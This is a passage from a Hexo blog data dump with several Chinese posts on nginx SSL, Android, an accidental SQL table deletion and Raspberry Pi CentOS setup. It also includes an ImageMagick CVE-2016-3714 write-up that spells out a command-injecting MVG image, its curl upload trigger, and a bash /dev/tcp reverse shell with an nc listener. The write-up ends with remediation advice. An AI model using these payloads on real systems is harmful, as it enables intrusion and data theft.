class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">listen 443 ssl;</span><br><span class=\"line\">server_name ssl1.xiaoai.me;</span><br></pre></td></tr></table></figure>\n<h4 id=\"证书配置\"><a href=\"#证书配置\" class=\"headerlink\" title=\"证书配置\"></a>证书配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssl_certificate server.crt;</span><br><span class=\"line\">ssl_certificate_key root.key;</span><br></pre></td></tr></table></figure>\n<h4 id=\"缓存优化\"><a href=\"#缓存优化\" class=\"headerlink\" title=\"缓存优化\"></a>缓存优化</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssl_session_cache shared:SSL:10m;</span><br><span class=\"line\">ssl_session_timeout 10m;</span><br></pre></td></tr></table></figure>\n<h2 id=\"信任证书\"><a href=\"#信任证书\" class=\"headerlink\" title=\"信任证书\"></a>信任证书</h2><p>现在访问 <a href=\"https://ssl1.xiaoai.me\" target=\"_blank\" rel=\"noopener\">https://ssl1.xiaoai.me</a> 会提示证书错误，需要将证书安装在系统信任根证书列表里．</p>\n<h4 id=\"导出网站证书\"><a href=\"#导出网站证书\" class=\"headerlink\" title=\"导出网站证书\"></a>导出网站证书</h4><p>从浏览器的查看证书选项里，导出证书．一般为 <strong>.cer 格式 </strong>文件</p>\n<h4 id=\"导入到根证书列表里\"><a href=\"#导入到根证书列表里\" class=\"headerlink\" title=\"导入到根证书列表里\"></a>导入到根证书列表里</h4><p>在开始菜单中运行 <strong>certmgr.msc</strong> 打开证书管理器，在 <strong>受信任的根证书颁发机构 </strong>，右键选择导入刚才的<strong>.cer</strong>格式文件，最终确定信任即可．</p>\n<p>最后需要重启下浏览器才能生效，接下来就可以看到纯绿色的https图标了</p>\n"},{"title":"记我的第一个安卓应用","id":"130","date":"2015-07-18T14:32:06.000Z","_content":"\n开始学习安卓，先试试做一个hello,world\n\n### 创建\n\n安装了Android Studio后，一键生成了HelloWorld的程序．\n\n程序命名我取作 **com.joaner.helloworld**．以后新的应用都在**com.joaner**下了．\n\n### **打包**\n\n我开启了手机的USB调试，但Studio无法识别到，只好生成APK文件来手工安装．\n\n### 运行\n\n[![Screenshot_2015-07-18-22-12-41](https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41-169x300.png)](https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41.png)","source":"_posts/e8-ae-b0-e6-88-91-e7-9a-84-e7-ac-ac-e4-b8-80-e4-b8-aa-e5-ae-89-e5-8d-93-e5-ba-94-e7-94-a8.md","raw":"---\ntitle: 记我的第一个安卓应用\nid: 130\ncategories:\n  - Android\ndate: 2015-07-18 22:32:06\ntags:\n---\n\n开始学习安卓，先试试做一个hello,world\n\n### 创建\n\n安装了Android Studio后，一键生成了HelloWorld的程序．\n\n程序命名我取作 **com.joaner.helloworld**．以后新的应用都在**com.joaner**下了．\n\n### **打包**\n\n我开启了手机的USB调试，但Studio无法识别到，只好生成APK文件来手工安装．\n\n### 运行\n\n[![Screenshot_2015-07-18-22-12-41](https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41-169x300.png)](https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41.png)","slug":"e8-ae-b0-e6-88-91-e7-9a-84-e7-ac-ac-e4-b8-80-e4-b8-aa-e5-ae-89-e5-8d-93-e5-ba-94-e7-94-a8","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhvw001tlzlmd9xomrtl","content":"<p>开始学习安卓，先试试做一个hello,world</p>\n<h3 id=\"创建\"><a href=\"#创建\" class=\"headerlink\" title=\"创建\"></a>创建</h3><p>安装了Android Studio后，一键生成了HelloWorld的程序．</p>\n<p>程序命名我取作 <strong>com.joaner.helloworld</strong>．以后新的应用都在<strong>com.joaner</strong>下了．</p>\n<h3 id=\"打包\"><a href=\"#打包\" class=\"headerlink\" title=\"打包\"></a><strong>打包</strong></h3><p>我开启了手机的USB调试，但Studio无法识别到，只好生成APK文件来手工安装．</p>\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><p><a href=\"https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41.png\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41-169x300.png\" alt=\"Screenshot_2015-07-18-22-12-41\"></a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>开始学习安卓，先试试做一个hello,world</p>\n<h3 id=\"创建\"><a href=\"#创建\" class=\"headerlink\" title=\"创建\"></a>创建</h3><p>安装了Android Studio后，一键生成了HelloWorld的程序．</p>\n<p>程序命名我取作 <strong>com.joaner.helloworld</strong>．以后新的应用都在<strong>com.joaner</strong>下了．</p>\n<h3 id=\"打包\"><a href=\"#打包\" class=\"headerlink\" title=\"打包\"></a><strong>打包</strong></h3><p>我开启了手机的USB调试，但Studio无法识别到，只好生成APK文件来手工安装．</p>\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><p><a href=\"https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41.png\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41-169x300.png\" alt=\"Screenshot_2015-07-18-22-12-41\"></a></p>\n"},{"title":"误删线上的表","id":"294","date":"2016-03-08T06:49:26.000Z","_content":"\n刚才在从线上表里删除产品时，不小心删除了整个表。也就是`where`条件没写上。\n\n因为是分几次删除，所以先把上次删除的命令调出来，然后修改后面的ID参数。\n\n```\ndelete from product where id ;\n```\n\n结果刚删掉老的参数，同事问我问题，我手就自然落在键盘上，触发了`Enter`键。\n\n幸好昨天晚上还备份过，所以用了两三分钟，将产品数据恢复过来了，不过服务因此也中断了几分钟。\n\n这是最严重的错误，以后绝对不能用SQL直接删除数据。\n","source":"_posts/e8-af-af-e5-88-a0-e7-ba-bf-e4-b8-8a-e7-9a-84-e8-a1-a8.md","raw":"---\ntitle: 误删线上的表\nid: 294\ncategories:\n  - php\ndate: 2016-03-08 14:49:26\ntags:\n---\n\n刚才在从线上表里删除产品时，不小心删除了整个表。也就是`where`条件没写上。\n\n因为是分几次删除，所以先把上次删除的命令调出来，然后修改后面的ID参数。\n\n```\ndelete from product where id ;\n```\n\n结果刚删掉老的参数，同事问我问题，我手就自然落在键盘上，触发了`Enter`键。\n\n幸好昨天晚上还备份过，所以用了两三分钟，将产品数据恢复过来了，不过服务因此也中断了几分钟。\n\n这是最严重的错误，以后绝对不能用SQL直接删除数据。\n","slug":"e8-af-af-e5-88-a0-e7-ba-bf-e4-b8-8a-e7-9a-84-e8-a1-a8","published":1,"updated":"2018-03-05T13:07:40.299Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhvy001vlzlmsjyo79og","content":"<p>刚才在从线上表里删除产品时，不小心删除了整个表。也就是<code>where</code>条件没写上。</p>\n<p>因为是分几次删除，所以先把上次删除的命令调出来，然后修改后面的ID参数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">delete from product where id ;</span><br></pre></td></tr></table></figure>\n<p>结果刚删掉老的参数，同事问我问题，我手就自然落在键盘上，触发了<code>Enter</code>键。</p>\n<p>幸好昨天晚上还备份过，所以用了两三分钟，将产品数据恢复过来了，不过服务因此也中断了几分钟。</p>\n<p>这是最严重的错误，以后绝对不能用SQL直接删除数据。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>刚才在从线上表里删除产品时，不小心删除了整个表。也就是<code>where</code>条件没写上。</p>\n<p>因为是分几次删除，所以先把上次删除的命令调出来，然后修改后面的ID参数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">delete from product where id ;</span><br></pre></td></tr></table></figure>\n<p>结果刚删掉老的参数，同事问我问题，我手就自然落在键盘上，触发了<code>Enter</code>键。</p>\n<p>幸好昨天晚上还备份过，所以用了两三分钟，将产品数据恢复过来了，不过服务因此也中断了几分钟。</p>\n<p>这是最严重的错误，以后绝对不能用SQL直接删除数据。</p>\n"},{"title":"ImageMagick远程命令执行漏洞","id":"297","date":"2016-05-19T15:26:42.000Z","_content":"\n最近ImageMagick爆出了命令执行漏洞，此漏洞允许攻击者通过上传恶意构造的图像文件，在目标服务器执行任意代码。参见中文版说明：\n\n> [CVE-2016-3714 - ImageMagick 命令执行分析](http://drops.wooyun.org/papers/15589)\n> [安全预警：ImageMagick图象处理软件存在远程代码执行(CVE-2016-3714)](http://www.freebuf.com/vuls/103504.html)\n\n## 漏洞重现\n\n1 先构造一个.mvg格式的图片，在其内容中可以注入任意命令。这里命名为`test.gif`：\n\n```\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(https://\"|curl http://127.0.0.1/hasbug; \")'\npop graphic-context\n```\n\n第三行就是注入的命令，用双引号作为注入分隔。后面的`curl http://127.0.0.1/hasbug;`就是可执行的命令。\n\n2 测试漏洞的脚本`http://localhost/test.php`，只需要一行代码：\n\n```\n<?php\nnew Imagick($_FILES['file']['tmp_name']);\n```\n\n3 在有漏洞的网站触发此执行漏洞：\n\n```\n$ curl -F \"file=@test.gif\" \"http://localhost/test.php\"\n```\n\n现在目标服务器就会执行注入的命令 `curl http://127.0.0.1/hasbug;`\n\n## 漏洞影响\n\n上面注入的脚本`curl`只是试探一下，我们可以通过反向shell的技巧执行任意命令。\n\n1 在执行前，需要在自己的服务器上建立命令执行平台：\n\n```\n$ nc -l 127.0.0.1:1234 -vvv\n```\n\n2 要注入的反向shell命令，替换`curl`的试探命令：\n\n```\nbash -i > /dev/tcp/127.0.0.1/1234 0<&amp;1 2>&amp;1\n```\n\n反向shell的作用是请求上面`nc`命令监听的`127.0.0.1:1234`，并且执行`nc`后续输入的远程命令。\n\n> [Linux建立反向shell的几种方式](http://xkon.github.io/2015/09/04/Linux%E5%BB%BA%E7%AB%8B%E5%8F%8D%E5%90%91shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/)\n\n3 由于服务器执行PHP的用户默认是`nobody`，对web目录一般都没有写权限。那么能干什么呢？\n\n1.  查看程序源代码\n2.  获得mysql数据库的访问权限\n3.  执行mysqldump等数据导出命令\n\n这个漏洞的主要的危害是数据泄漏。\n\n据传 http://nulled.io/ 就是中了ImageMagick这个漏洞，导致9G大的数据库泄漏了。\n\n> [国外知名黑客论坛被黑，疑因imageTragick漏洞](http://www.freebuf.com/news/104757.html)\n\n## 漏洞修复\n\n这个漏洞影响ImageMagick 6.9.3-9以前的所有版本，可以通过更新ImageMagick库，或者在程序中用`getimagesize()`先对上传文件检验一下。\n\n详细方法见开头的分析链接。\n","source":"_posts/e8-bf-9c-e7-a8-8b-e5-91-bd-e4-bb-a4-e6-89-a7-e8-a1-8c-e6-96-b0-e6-8a-80-e5-b7-a7.md","raw":"---\ntitle: ImageMagick远程命令执行漏洞\nid: 297\ncategories:\n  - linux\n  - php\ndate: 2016-05-19 23:26:42\ntags:\n---\n\n最近ImageMagick爆出了命令执行漏洞，此漏洞允许攻击者通过上传恶意构造的图像文件，在目标服务器执行任意代码。参见中文版说明：\n\n> [CVE-2016-3714 - ImageMagick 命令执行分析](http://drops.wooyun.org/papers/15589)\n> [安全预警：ImageMagick图象处理软件存在远程代码执行(CVE-2016-3714)](http://www.freebuf.com/vuls/103504.html)\n\n## 漏洞重现\n\n1 先构造一个.mvg格式的图片，在其内容中可以注入任意命令。这里命名为`test.gif`：\n\n```\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(https://\"|curl http://127.0.0.1/hasbug; \")'\npop graphic-context\n```\n\n第三行就是注入的命令，用双引号作为注入分隔。后面的`curl http://127.0.0.1/hasbug;`就是可执行的命令。\n\n2 测试漏洞的脚本`http://localhost/test.php`，只需要一行代码：\n\n```\n<?php\nnew Imagick($_FILES['file']['tmp_name']);\n```\n\n3 在有漏洞的网站触发此执行漏洞：\n\n```\n$ curl -F \"file=@test.gif\" \"http://localhost/test.php\"\n```\n\n现在目标服务器就会执行注入的命令 `curl http://127.0.0.1/hasbug;`\n\n## 漏洞影响\n\n上面注入的脚本`curl`只是试探一下，我们可以通过反向shell的技巧执行任意命令。\n\n1 在执行前，需要在自己的服务器上建立命令执行平台：\n\n```\n$ nc -l 127.0.0.1:1234 -vvv\n```\n\n2 要注入的反向shell命令，替换`curl`的试探命令：\n\n```\nbash -i > /dev/tcp/127.0.0.1/1234 0<&amp;1 2>&amp;1\n```\n\n反向shell的作用是请求上面`nc`命令监听的`127.0.0.1:1234`，并且执行`nc`后续输入的远程命令。\n\n> [Linux建立反向shell的几种方式](http://xkon.github.io/2015/09/04/Linux%E5%BB%BA%E7%AB%8B%E5%8F%8D%E5%90%91shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/)\n\n3 由于服务器执行PHP的用户默认是`nobody`，对web目录一般都没有写权限。那么能干什么呢？\n\n1.  查看程序源代码\n2.  获得mysql数据库的访问权限\n3.  执行mysqldump等数据导出命令\n\n这个漏洞的主要的危害是数据泄漏。\n\n据传 http://nulled.io/ 就是中了ImageMagick这个漏洞，导致9G大的数据库泄漏了。\n\n> [国外知名黑客论坛被黑，疑因imageTragick漏洞](http://www.freebuf.com/news/104757.html)\n\n## 漏洞修复\n\n这个漏洞影响ImageMagick 6.9.3-9以前的所有版本，可以通过更新ImageMagick库，或者在程序中用`getimagesize()`先对上传文件检验一下。\n\n详细方法见开头的分析链接。\n","slug":"e8-bf-9c-e7-a8-8b-e5-91-bd-e4-bb-a4-e6-89-a7-e8-a1-8c-e6-96-b0-e6-8a-80-e5-b7-a7","published":1,"updated":"2018-03-05T13:07:03.374Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhvz001ylzlme2usqwdj","content":"<p>最近ImageMagick爆出了命令执行漏洞，此漏洞允许攻击者通过上传恶意构造的图像文件，在目标服务器执行任意代码。参见中文版说明：</p>\n<blockquote>\n<p><a href=\"http://drops.wooyun.org/papers/15589\" target=\"_blank\" rel=\"noopener\">CVE-2016-3714 - ImageMagick 命令执行分析</a><br><a href=\"http://www.freebuf.com/vuls/103504.html\" target=\"_blank\" rel=\"noopener\">安全预警：ImageMagick图象处理软件存在远程代码执行(CVE-2016-3714)</a></p>\n</blockquote>\n<h2 id=\"漏洞重现\"><a href=\"#漏洞重现\" class=\"headerlink\" title=\"漏洞重现\"></a>漏洞重现</h2><p>1 先构造一个.mvg格式的图片，在其内容中可以注入任意命令。这里命名为<code>test.gif</code>：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push graphic-context</span><br><span class=\"line\">viewbox 0 0 640 480</span><br><span class=\"line\">fill &apos;url(https://&quot;|curl http://127.0.0.1/hasbug; &quot;)&apos;</span><br><span class=\"line\">pop graphic-context</span><br></pre></td></tr></table></figure>\n<p>第三行就是注入的命令，用双引号作为注入分隔。后面的<code>curl http://127.0.0.1/hasbug;</code>就是可执行的命令。</p>\n<p>2 测试漏洞的脚本<code>http://localhost/test.php</code>，只需要一行代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">new Imagick($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br></pre></td></tr></table></figure>\n<p>3 在有漏洞的网站触发此执行漏洞：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ curl -F &quot;file=@test.gif&quot; &quot;http://localhost/test.php&quot;</span><br></pre></td></tr></table></figure>\n<p>现在目标服务器就会执行注入的命令 <code>curl http://127.0.0.1/hasbug;</code></p>\n<h2 id=\"漏洞影响\"><a href=\"#漏洞影响\" class=\"headerlink\" title=\"漏洞影响\"></a>漏洞影响</h2><p>上面注入的脚本<code>curl</code>只是试探一下，我们可以通过反向shell的技巧执行任意命令。</p>\n<p>1 在执行前，需要在自己的服务器上建立命令执行平台：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ nc -l 127.0.0.1:1234 -vvv</span><br></pre></td></tr></table></figure>\n<p>2 要注入的反向shell命令，替换<code>curl</code>的试探命令：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt; /dev/tcp/127.0.0.1/1234 0&lt;&amp;amp;1 2&gt;&amp;amp;1</span><br></pre></td></tr></table></figure>\n<p>反向shell的作用是请求上面<code>nc</code>命令监听的<code>127.0.0.1:1234</code>，并且执行<code>nc</code>后续输入的远程命令。</p>\n<blockquote>\n<p><a href=\"http://xkon.github.io/2015/09/04/Linux%E5%BB%BA%E7%AB%8B%E5%8F%8D%E5%90%91shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/\" target=\"_blank\" rel=\"noopener\">Linux建立反向shell的几种方式</a></p>\n</blockquote>\n<p>3 由于服务器执行PHP的用户默认是<code>nobody</code>，对web目录一般都没有写权限。那么能干什么呢？</p>\n<ol>\n<li>查看程序源代码</li>\n<li>获得mysql数据库的访问权限</li>\n<li>执行mysqldump等数据导出命令</li>\n</ol>\n<p>这个漏洞的主要的危害是数据泄漏。</p>\n<p>据传 <a href=\"http://nulled.io/\" target=\"_blank\" rel=\"noopener\">http://nulled.io/</a> 就是中了ImageMagick这个漏洞，导致9G大的数据库泄漏了。</p>\n<blockquote>\n<p><a href=\"http://www.freebuf.com/news/104757.html\" target=\"_blank\" rel=\"noopener\">国外知名黑客论坛被黑，疑因imageTragick漏洞</a></p>\n</blockquote>\n<h2 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h2><p>这个漏洞影响ImageMagick 6.9.3-9以前的所有版本，可以通过更新ImageMagick库，或者在程序中用<code>getimagesize()</code>先对上传文件检验一下。</p>\n<p>详细方法见开头的分析链接。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>最近ImageMagick爆出了命令执行漏洞，此漏洞允许攻击者通过上传恶意构造的图像文件，在目标服务器执行任意代码。参见中文版说明：</p>\n<blockquote>\n<p><a href=\"http://drops.wooyun.org/papers/15589\" target=\"_blank\" rel=\"noopener\">CVE-2016-3714 - ImageMagick 命令执行分析</a><br><a href=\"http://www.freebuf.com/vuls/103504.html\" target=\"_blank\" rel=\"noopener\">安全预警：ImageMagick图象处理软件存在远程代码执行(CVE-2016-3714)</a></p>\n</blockquote>\n<h2 id=\"漏洞重现\"><a href=\"#漏洞重现\" class=\"headerlink\" title=\"漏洞重现\"></a>漏洞重现</h2><p>1 先构造一个.mvg格式的图片，在其内容中可以注入任意命令。这里命名为<code>test.gif</code>：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push graphic-context</span><br><span class=\"line\">viewbox 0 0 640 480</span><br><span class=\"line\">fill &apos;url(https://&quot;|curl http://127.0.0.1/hasbug; &quot;)&apos;</span><br><span class=\"line\">pop graphic-context</span><br></pre></td></tr></table></figure>\n<p>第三行就是注入的命令，用双引号作为注入分隔。后面的<code>curl http://127.0.0.1/hasbug;</code>就是可执行的命令。</p>\n<p>2 测试漏洞的脚本<code>http://localhost/test.php</code>，只需要一行代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">new Imagick($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br></pre></td></tr></table></figure>\n<p>3 在有漏洞的网站触发此执行漏洞：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ curl -F &quot;file=@test.gif&quot; &quot;http://localhost/test.php&quot;</span><br></pre></td></tr></table></figure>\n<p>现在目标服务器就会执行注入的命令 <code>curl http://127.0.0.1/hasbug;</code></p>\n<h2 id=\"漏洞影响\"><a href=\"#漏洞影响\" class=\"headerlink\" title=\"漏洞影响\"></a>漏洞影响</h2><p>上面注入的脚本<code>curl</code>只是试探一下，我们可以通过反向shell的技巧执行任意命令。</p>\n<p>1 在执行前，需要在自己的服务器上建立命令执行平台：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ nc -l 127.0.0.1:1234 -vvv</span><br></pre></td></tr></table></figure>\n<p>2 要注入的反向shell命令，替换<code>curl</code>的试探命令：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt; /dev/tcp/127.0.0.1/1234 0&lt;&amp;amp;1 2&gt;&amp;amp;1</span><br></pre></td></tr></table></figure>\n<p>反向shell的作用是请求上面<code>nc</code>命令监听的<code>127.0.0.1:1234</code>，并且执行<code>nc</code>后续输入的远程命令。</p>\n<blockquote>\n<p><a href=\"http://xkon.github.io/2015/09/04/Linux%E5%BB%BA%E7%AB%8B%E5%8F%8D%E5%90%91shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/\" target=\"_blank\" rel=\"noopener\">Linux建立反向shell的几种方式</a></p>\n</blockquote>\n<p>3 由于服务器执行PHP的用户默认是<code>nobody</code>，对web目录一般都没有写权限。那么能干什么呢？</p>\n<ol>\n<li>查看程序源代码</li>\n<li>获得mysql数据库的访问权限</li>\n<li>执行mysqldump等数据导出命令</li>\n</ol>\n<p>这个漏洞的主要的危害是数据泄漏。</p>\n<p>据传 <a href=\"http://nulled.io/\" target=\"_blank\" rel=\"noopener\">http://nulled.io/</a> 就是中了ImageMagick这个漏洞，导致9G大的数据库泄漏了。</p>\n<blockquote>\n<p><a href=\"http://www.freebuf.com/news/104757.html\" target=\"_blank\" rel=\"noopener\">国外知名黑客论坛被黑，疑因imageTragick漏洞</a></p>\n</blockquote>\n<h2 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h2><p>这个漏洞影响ImageMagick 6.9.3-9以前的所有版本，可以通过更新ImageMagick库，或者在程序中用<code>getimagesize()</code>先对上传文件检验一下。</p>\n<p>详细方法见开头的分析链接。</p>\n"},{"title":"重新折腾树莓派","id":"260","date":"2016-01-06T13:56:28.000Z","_content":"\n前一阵买了个树莓派，可是三分钟热度没玩几天就扔下了。现在由于手头没有linux机器，所以又开始折腾了。\n\n## 记录下我遇到的问题：\n\n### 有线网卡灯不亮\n\n这是电流强度不足的问题，需要确保输出电流是2A，才能带动网卡运行。通常手机充电器只有1.5A的输出，所以只能保证系统基本运转。\n我的充电器是从淘宝买的树莓派专用的。\n\n### 能用centos吗？\n\n现在可以了，centos7有arm树莓派版。下载地址：\n\n> [CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz](http://mirror.centos.org/altarch/7/isos/armhfp/CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz)\n\n启动盘制作方法有很多参考资料，win10下面我用的Win32DiskImager，和烧录其它img没有区别。\n注意启动树莓派后，不需要显示器界面来设置密码。直接SSH用户名`root`，密码`centos`即可登录，参见：\n\n> [CentOS 7 for ARM 初体验](https://www.anyran.com/2015/12/21818.html)\n\n### 编译遇到的问题\n\n用yum安装`libxml2`时，提示缺少`xz-devel`，但是yum仓库里没有`xz-devel.armv7hl`\n\n    $ sudo yum install libxml2-devel\n    ---> Package libxml2-devel.armv7hl 0:2.9.1-6.el7.2 will be installed\n    --> Processing Dependency: xz-devel for package: libxml2-devel-2.9.1-6.el7.2.armv7hl\n    --> Finished Dependency Resolution\n    Error: Package: libxml2-devel-2.9.1-6.el7.2.armv7hl (updates)\n               Requires: xz-devel\n\n    $ sudo yum install xz-devel\n    No package xz-devel available.\n    `\n```\n\n    `xz-devel`目前只在官方dev仓库里有：http://armv7.dev.centos.org/repodir/c7-buildroot/xz/\n\n```\n`sudo rpm -i \"http://armv7.dev.centos.org/repodir/c7-buildroot/xz/xz-devel-5.1.2-9alpha.el7.armv7hl.rpm\"\n\n所以单独从RPM文件安装`xz-devel`，之后，就能顺利编译PHP的libxml2模块。","source":"_posts/e9-87-8d-e6-96-b0-e6-8a-98-e8-85-be-e6-a0-91-e8-8e-93-e6-b4-be.md","raw":"---\ntitle: 重新折腾树莓派\nid: 260\ncategories:\n  - linux\ndate: 2016-01-06 21:56:28\ntags:\n---\n\n前一阵买了个树莓派，可是三分钟热度没玩几天就扔下了。现在由于手头没有linux机器，所以又开始折腾了。\n\n## 记录下我遇到的问题：\n\n### 有线网卡灯不亮\n\n这是电流强度不足的问题，需要确保输出电流是2A，才能带动网卡运行。通常手机充电器只有1.5A的输出，所以只能保证系统基本运转。\n我的充电器是从淘宝买的树莓派专用的。\n\n### 能用centos吗？\n\n现在可以了，centos7有arm树莓派版。下载地址：\n\n> [CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz](http://mirror.centos.org/altarch/7/isos/armhfp/CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz)\n\n启动盘制作方法有很多参考资料，win10下面我用的Win32DiskImager，和烧录其它img没有区别。\n注意启动树莓派后，不需要显示器界面来设置密码。直接SSH用户名`root`，密码`centos`即可登录，参见：\n\n> [CentOS 7 for ARM 初体验](https://www.anyran.com/2015/12/21818.html)\n\n### 编译遇到的问题\n\n用yum安装`libxml2`时，提示缺少`xz-devel`，但是yum仓库里没有`xz-devel.armv7hl`\n\n    $ sudo yum install libxml2-devel\n    ---> Package libxml2-devel.armv7hl 0:2.9.1-6.el7.2 will be installed\n    --> Processing Dependency: xz-devel for package: libxml2-devel-2.9.1-6.el7.2.armv7hl\n    --> Finished Dependency Resolution\n    Error: Package: libxml2-devel-2.9.1-6.el7.2.armv7hl (updates)\n               Requires: xz-devel\n\n    $ sudo yum install xz-devel\n    No package xz-devel available.\n    `\n```\n\n    `xz-devel`目前只在官方dev仓库里有：http://armv7.dev.centos.org/repodir/c7-buildroot/xz/\n\n```\n`sudo rpm -i \"http://armv7.dev.centos.org/repodir/c7-buildroot/xz/xz-devel-5.1.2-9alpha.el7.armv7hl.rpm\"\n\n所以单独从RPM文件安装`xz-devel`，之后，就能顺利编译PHP的libxml2模块。","slug":"e9-87-8d-e6-96-b0-e6-8a-98-e8-85-be-e6-a0-91-e8-8e-93-e6-b4-be","published":1,"updated":"2018-03-05T12:59:05.615Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhw10020lzlmv39saetr","content":"<p>前一阵买了个树莓派，可是三分钟热度没玩几天就扔下了。现在由于手头没有linux机器，所以又开始折腾了。</p>\n<h2 id=\"记录下我遇到的问题：\"><a href=\"#记录下我遇到的问题：\" class=\"headerlink\" title=\"记录下我遇到的问题：\"></a>记录下我遇到的问题：</h2><h3 id=\"有线网卡灯不亮\"><a href=\"#有线网卡灯不亮\" class=\"headerlink\" title=\"有线网卡灯不亮\"></a>有线网卡灯不亮</h3><p>这是电流强度不足的问题，需要确保输出电流是2A，才能带动网卡运行。通常手机充电器只有1.5A的输出，所以只能保证系统基本运转。<br>我的充电器是从淘宝买的树莓派专用的。</p>\n<h3 id=\"能用centos吗？\"><a href=\"#能用centos吗？\" class=\"headerlink\" title=\"能用centos吗？\"></a>能用centos吗？</h3><p>现在可以了，centos7有arm树莓派版。下载地址：</p>\n<blockquote>\n<p><a href=\"http://mirror.centos.org/altarch/7/isos/armhfp/CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz\" target=\"_blank\" rel=\"noopener\">CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz</a></p>\n</blockquote>\n<p>启动盘制作方法有很多参考资料，win10下面我用的Win32DiskImager，和烧录其它img没有区别。<br>注意启动树莓派后，不需要显示器界面来设置密码。直接SSH用户名<code>root</code>，密码<code>centos</code>即可登录，参见：</p>\n<blockquote>\n<p><a href=\"https://www.anyran.com/2015/12/21818.html\" target=\"_blank\" rel=\"noopener\">CentOS 7 for ARM 初体验</a></p>\n</blockquote>\n<h3 id=\"编译遇到的问题\"><a href=\"#编译遇到的问题\" class=\"headerlink\" title=\"编译遇到的问题\"></a>编译遇到的问题</h3><p>用yum安装<code>libxml2</code>时，提示缺少<code>xz-devel</code>，但是yum仓库里没有<code>xz-devel.armv7hl</code></p>\n<pre><code>$ sudo yum install libxml2-devel\n---&gt; Package libxml2-devel.armv7hl 0:2.9.1-6.el7.2 will be installed\n--&gt; Processing Dependency: xz-devel for package: 